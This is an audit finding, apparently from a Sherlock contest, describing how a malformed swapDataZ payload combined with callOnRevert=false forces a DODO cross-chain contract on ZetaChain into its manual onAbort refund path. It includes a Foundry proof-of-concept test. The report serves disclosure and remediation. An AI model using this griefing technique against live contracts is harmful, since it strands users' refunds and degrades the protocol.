# User can trigger manual fallback refund by breaking onCall with malformed swapData

### Summary

A malicious user can force ZetaChain into its fallback refund path (`onAbort`) by supplying a malformed `swapDataZ` payload and setting `callOnRevert = false`. This triggers a decoding panic in `onCall()` even when assets have been transferred, bypassing the automatic refund mechanism (`onRevert`) and causing the refund to be stranded on ZetaChain.

This undermines ZetaChain’s “execute or refund” model by turning what should have been an immediate refund into a manual, delayed fallback flow. The attack is low-cost, deterministic, and can be repeated to degrade protocol behavior.


### Root Cause

In [`GatewayCrossChain.sol#L453`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L453), `swapDataZ` is decoded via `decodeCompressedMixSwapParams()` in [`SwapDataHelperLib.sol#L86`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/libraries/SwapDataHelperLib.sol#L86) without validating its length. This low-level function reads calldata using `assembly`, and if the length is insufficient, it triggers a `panic: 0x32` (out-of-bounds).

This panic is uncaught and causes `onCall()` to fail. If `callOnRevert = false`, ZetaChain unconditionally enters `onAbort()`, per [official documentation](https://www.zetachain.com/docs/developers/chains/zetachain/#revert-transactions) — even if value was transferred. Unlike other message fields, `swapDataZ` alone undergoes deep decoding and dereferencing, making it the critical vector.

### Internal Pre-conditions

1. The user directly calls `GatewayZEVM.depositAndCall()` (bypassing `GatewaySend`, which always sets `callOnRevert = true`).
2. The user sets `callOnRevert = false`.
3. A valid token amount is sent.
4. The payload includes a malformed `swapDataZ` that causes a decoding panic in `onCall()`.

### External Pre-conditions

None.

### Attack Path

1. The attacker mints and approves ERC20 tokens to `gatewayA`, which is deployed on a standard EVM chain.
2. They construct a `depositAndCall()` payload with:
   - A valid token amount.
   - A malformed `swapDataZ` (e.g., 1 byte).
   - `callOnRevert = false`.
3. When `onCall()` runs, the decoder fails and panics.
4. Since `callOnRevert = false`, the protocol routes to `onAbort()` even though tokens were transferred.
5. The refund is recorded on ZetaChain, requiring manual claiming via `claimRefund()`.

### Impact

This breaks ZetaChain’s “execute or refund” guarantee and causes funds to be trapped in a manual claim path. Since the attack is deterministic and repeatable, it opens the door to systemic griefing and undermines user trust.



### PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {BaseTest} from "./BaseTest.t.sol";
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";

contract PoC_PayloadInjection is BaseTest {
    function test_PayloadInjection_TriggerOnRevert() public {
        address targetContract = address(gatewayCrossChain); 
        uint256 amount = 100 ether;
        address asset = address(token2A);
        uint32 dstChainId = 2;
        address targetZRC20 = address(token2Z);
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));

        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = abi.encodePacked(user2);

        // intentionally too short to trigger decode panic
        bytes memory swapDataZ = new bytes(1);

        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        bytes memory fromTokenB = abi.encodePacked(address(token2B));
        bytes memory toTokenB = abi.encodePacked(address(token1B));

        bytes memory swapDataB = encodeCompressedMixSwapParams(
            address(token2B),
            address(token1B),
            98995986959878634903,
            0,
            0,
            new address[](1),
            new address[](1),
            new address[](1),
            0,
            new bytes[](1),
            abi.encode(address(0), 0),
            block.timestamp + 600
        );

        bytes memory accounts = "";

        bytes memory payload = encodeMessage(
            dstChainId,
            targetZRC20, 
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(fromTokenB, toTokenB, swapDataB),
            accounts
        );

        bytes memory message = bytes.concat(externalId, payload);

        // Force fallback to onAbort by setting callOnRevert=false
        RevertOptions memory revertOptions = RevertOptions({
            revertAddress: address(0), // just ignore 
            callOnRevert: false, // point 
            abortAddress: targetContract,
            revertMessage: bytes.concat(externalId, bytes20(user2)),
            onRevertGasLimit: 300_000
        });

        token2A.mint(user1, amount);
        vm.startPrank(user1);
        token2A.approve(address(gatewayA), amount);

        // Call GatewayZEVM.depositAndCall with the crafted message
        // This will trigger the panic in onCall() due to the malformed swapDataZ
        vm.expectRevert("panic: array out-of-bounds access (0x32)"); 
        gatewayA.depositAndCall(
            targetContract,
            amount,
            asset,
            message,
            revertOptions
        );
        vm.stopPrank();
    }
}
```


### Mitigation

Add a minimum length validation for `swapDataZ` before decoding in `onCall()` to prevent trivial panic-based fallback abuse.

However, note that this only mitigates decoding-level panics. A determined user may still trigger `onCall()` failure using valid-length but malformed data (e.g., invalid swap paths or unsupported tokens).

Maybe outside the immediate scope, limiting `callOnRevert == false` when tokens are transferred can further reduce avoidable fallback entries and potential abuse.
